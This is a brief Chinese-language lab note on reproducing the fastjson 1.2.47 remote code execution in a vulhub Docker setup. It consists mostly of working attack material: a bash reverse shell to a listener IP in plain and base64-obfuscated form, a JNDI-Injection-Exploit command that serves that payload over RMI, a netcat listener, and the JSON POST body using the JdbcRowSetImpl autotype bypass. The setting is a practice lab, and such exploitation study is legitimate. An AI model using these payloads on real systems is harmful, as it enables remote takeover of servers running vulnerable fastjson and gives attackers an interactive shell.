# vulhub:

找到fastjson1.2.47rce

```sh
docker-compose up -d
nc -lvp 9443
```



# attacker

反弹shell

```sh
bash -i >& /dev/tcp/192.168.211.129/9443 0>&1
```

加密

```sh
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4xMjkvOTQ0MyAwPiYx}|{base64,-d}|{bash,-i}
```

最后的ip是apache服务器的，172.26.39.196的wls2启动apache命令`/usr/local/apache-tomcat-8.5.69/bin# ./startup.sh `

Windows访问WSL2子系统的文件夹，在文件资源管理器输入`\\wsl$`

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4xMjkvOTQ0MyAwPiYx}|{base64,-d}|{bash,-i}" -A "172.26.39.196"
```

起监听

```bash
nc -lvp 9443
```

# post:

Content-Type:application/json

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://172.26.39.196:1099/mmwktn",
        "autoCommit":true
    }
}

其中dataSourceName是JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar产生的jdk1.8的rmi地址
